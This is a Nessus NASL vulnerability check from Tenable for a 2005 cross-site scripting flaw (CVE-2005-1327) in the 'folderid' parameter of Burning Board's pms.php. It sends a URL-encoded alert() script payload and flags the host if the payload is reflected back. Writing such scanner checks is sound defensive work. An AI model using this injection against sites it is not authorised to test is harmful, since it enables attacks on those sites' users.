#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18251);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-1327");
  script_bugtraq_id(13353);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"15907");
  }

  name["english"] = "Burning Board pms.php Cross-Site Scripting Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis : 

The remote web server contains a PHP script which is vulnerable to a cross
site scripting vulnerability.

Description :

The version of Burning Board or Burning Board Lite installed on the
remote host may be prone to cross-site scripting attacks due to its
failure to properly sanitize input passed to the 'folderid' parameter
of the 'pms.php' script.  An attacker may be able to exploit this flaw
to cause arbitrary HTML and script code to be run in a user's browser
within the context of the affected website. 

See also : 

http://www.securityfocus.com/archive/1/396858
http://www.woltlab.com/news/399_en.php

Solution : 

Apply the security update referenced above.

Risk factor : 

Low / CVSS Base Score : 3
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for cross-site scripting vulnerability in Burning Board's pms.php script";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses : XSS";
  script_family(english:family["english"]);

  script_dependencie("burning_board_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + " was here');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "%20was%20here')%3B%3C%2Fscript%3E";

kb1 =   get_kb_list(string("www/", port, "/burning_board"));
if ( isnull(kb1) ) kb1 = make_list();
else kb1 = make_list(kb1);

kb2 =   get_kb_list(string("www/", port, "/burning_board_lite"));
if ( isnull(kb2) ) kb2 = make_list();
else kb2 = make_list(kb2);

# Test any installs.
installs = make_list(kb1, kb2);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];

    # Try to exploit it.
    req = http_get(item:string(dir, "/pms.php?folderid=", exss), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< res) {
	security_note(port);
      exit(0);
    }
  }
}
